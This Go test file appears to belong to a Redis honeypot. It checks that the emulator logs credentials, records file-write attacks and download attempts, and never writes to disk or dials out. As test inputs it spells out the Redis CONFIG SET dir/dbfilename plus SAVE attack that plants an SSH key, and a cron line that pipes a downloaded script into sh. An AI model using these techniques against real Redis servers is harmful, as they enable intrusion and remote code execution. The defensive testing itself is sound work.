package redis

import (
	"bufio"
	"crypto/sha256"
	"encoding/hex"
	"fmt"
	"io"
	"net"
	"os"
	"strconv"
	"strings"
	"sync/atomic"
	"testing"
	"time"

	"sweetty/internal/persona"
	"sweetty/internal/testharness"
)

func TestRedisInfoMatchesPersona(t *testing.T) {
	h, p, c := setupRedis(t)
	defer h.Close()

	c.send("PING")
	if got := c.simple(); got != "PONG" {
		t.Fatalf("PING = %q, want PONG", got)
	}

	c.send("INFO")
	info := c.bulk()
	for _, want := range []string{
		"redis_version:" + p.RedisVer,
		"os:Linux " + p.KernelRel + " " + p.Arch,
		"tcp_port:6379",
		"role:master",
	} {
		if !strings.Contains(info, want) {
			t.Fatalf("INFO missing %q:\n%s", want, info)
		}
	}

	c.send("CONFIG", "GET", "dir")
	if got := c.array(); len(got) != 2 || got[0] != "dir" || got[1] != "/var/lib/redis" {
		t.Fatalf("CONFIG GET dir = %#v", got)
	}
}

func TestRedisCapturesWritePrimitiveAsDropper(t *testing.T) {
	h, _, c := setupRedis(t)
	defer h.Close()
	file := fmt.Sprintf("sweetty_redis_canary_%d.rdb", os.Getpid())
	path := "/tmp/" + file
	payload := "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFakeAttackerKey bot@scan\n"

	c.send("AUTH", "default", "hunter2")
	c.wantOK()
	c.send("SELECT", "0")
	c.wantOK()
	c.send("CONFIG", "SET", "dir", "/tmp")
	c.wantOK()
	c.send("CONFIG", "SET", "dbfilename", file)
	c.wantOK()
	c.send("SET", "crackit", payload)
	c.wantOK()
	c.send("SAVE")
	c.wantOK()

	cred, ok := h.WaitEvent("CREDENTIAL", 2*time.Second)
	if !ok {
		t.Fatal("AUTH did not log a credential")
	}
	if cred.Username != "default" || cred.Password != "hunter2" {
		t.Fatalf("credential = %q/%q, want default/hunter2", cred.Username, cred.Password)
	}

	drop, ok := h.WaitEvent("DROPPER", 2*time.Second)
	if !ok {
		t.Fatal("Redis write primitive did not log DROPPER")
	}
	if drop.Filename != path {
		t.Fatalf("dropper filename = %q, want %q", drop.Filename, path)
	}
	if drop.Command != "redis save crackit" {
		t.Fatalf("dropper command = %q, want redis save crackit", drop.Command)
	}
	if drop.Data != payload {
		t.Fatalf("dropper data = %q, want %q", drop.Data, payload)
	}
	sum := sha256.Sum256([]byte(payload))
	if drop.SHA256 != hex.EncodeToString(sum[:]) {
		t.Fatalf("dropper sha = %q, want %x", drop.SHA256, sum)
	}
	if _, err := os.Stat(path); !os.IsNotExist(err) {
		t.Fatalf("Redis SAVE wrote attacker bytes to the host at %q (err=%v)", path, err)
	}
}

func TestRedisURLPayloadLogsDownloadWithoutDialing(t *testing.T) {
	h, _, c := setupRedis(t)
	defer h.Close()
	ln, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		t.Fatal(err)
	}
	defer ln.Close()
	var accepted int32
	go func() {
		for {
			conn, err := ln.Accept()
			if err != nil {
				return
			}
			atomic.StoreInt32(&accepted, 1)
			conn.Close()
		}
	}()
	url := "http://" + ln.Addr().String() + "/redis.sh"
	payload := "* * * * * curl " + url + " | sh\n"

	c.send("CONFIG", "SET", "dir", "/tmp")
	c.wantOK()
	c.send("CONFIG", "SET", "dbfilename", "cron")
	c.wantOK()
	c.send("SET", "cronjob", payload)
	c.wantOK()
	c.send("SAVE")
	c.wantOK()

	dl, ok := h.WaitEvent("DOWNLOAD_ATTEMPT", 2*time.Second)
	if !ok {
		t.Fatal("URL-bearing Redis payload did not log DOWNLOAD_ATTEMPT")
	}
	if dl.URL != url {
		t.Fatalf("download URL = %q, want %q", dl.URL, url)
	}
	if dl.Host != ln.Addr().String() {
		t.Fatalf("download host = %q, want %q", dl.Host, ln.Addr().String())
	}
	if dl.Filename != "redis.sh" {
		t.Fatalf("download filename = %q, want redis.sh", dl.Filename)
	}
	time.Sleep(200 * time.Millisecond)
	if atomic.LoadInt32(&accepted) != 0 {
		t.Fatal("Redis payload handling opened a real outbound connection")
	}
}

func TestRedisMalformedRESPStaysInert(t *testing.T) {
	for name, payload := range map[string]string{
		"bad-array-length": "*not-a-count\r\n",
		"bad-bulk-length":  "*1\r\n$not-a-count\r\n",
		"bad-bulk-trailer": "*1\r\n$4\r\nxyzzzz",
	} {
		t.Run(name, func(t *testing.T) {
			h, _, _ := setupRedis(t)
			defer h.Close()

			h.Send(payload)
			_ = h.ReadFor(200 * time.Millisecond)

			if _, ok := h.WaitEvent("REDIS_MALFORMED", 2*time.Second); !ok {
				t.Fatal("malformed RESP was not logged")
			}
			if h.HasEvent("DROPPER") {
				t.Fatal("malformed RESP reached dropper handling")
			}
			if h.HasEvent("DOWNLOAD_ATTEMPT") {
				t.Fatal("malformed RESP reached download handling")
			}
		})
	}
}

func setupRedis(t *testing.T) (*testharness.Harness, *persona.Persona, *redisClient) {
	t.Helper()
	p := persona.GenerateProfile("infra")
	h, err := testharness.New(New(p))
	if err != nil {
		t.Fatal(err)
	}
	return h, p, &redisClient{t: t, r: bufio.NewReader(h.Client), h: h}
}

type redisClient struct {
	t *testing.T
	r *bufio.Reader
	h *testharness.Harness
}

func (c *redisClient) send(args ...string) {
	c.t.Helper()
	var b strings.Builder
	b.WriteString("*" + strconv.Itoa(len(args)) + "\r\n")
	for _, arg := range args {
		b.WriteString("$" + strconv.Itoa(len(arg)) + "\r\n")
		b.WriteString(arg)
		b.WriteString("\r\n")
	}
	c.h.Send(b.String())
}

func (c *redisClient) wantOK() {
	c.t.Helper()
	if got := c.simple(); got != "OK" {
		c.t.Fatalf("response = %q, want OK", got)
	}
}

func (c *redisClient) simple() string {
	c.t.Helper()
	line := c.line()
	if !strings.HasPrefix(line, "+") {
		c.t.Fatalf("response %q is not a simple string", line)
	}
	return strings.TrimPrefix(line, "+")
}

func (c *redisClient) bulk() string {
	c.t.Helper()
	line := c.line()
	if !strings.HasPrefix(line, "$") {
		c.t.Fatalf("response %q is not a bulk string", line)
	}
	n, err := strconv.Atoi(strings.TrimPrefix(line, "$"))
	if err != nil || n < 0 {
		c.t.Fatalf("invalid bulk length %q", line)
	}
	buf := make([]byte, n+2)
	if _, err := io.ReadFull(c.r, buf); err != nil {
		c.t.Fatalf("read bulk payload: %v", err)
	}
	if string(buf[n:]) != "\r\n" {
		c.t.Fatalf("bulk payload missing CRLF trailer: %q", buf[n:])
	}
	return string(buf[:n])
}

func (c *redisClient) array() []string {
	c.t.Helper()
	line := c.line()
	if !strings.HasPrefix(line, "*") {
		c.t.Fatalf("response %q is not an array", line)
	}
	n, err := strconv.Atoi(strings.TrimPrefix(line, "*"))
	if err != nil || n < 0 {
		c.t.Fatalf("invalid array length %q", line)
	}
	out := make([]string, 0, n)
	for range n {
		out = append(out, c.bulk())
	}
	return out
}

func (c *redisClient) line() string {
	c.t.Helper()
	c.h.Client.SetReadDeadline(time.Now().Add(2 * time.Second))
	line, err := c.r.ReadString('\n')
	if err != nil {
		c.t.Fatalf("read Redis response line: %v", err)
	}
	return strings.TrimSuffix(strings.TrimSuffix(line, "\n"), "\r")
}
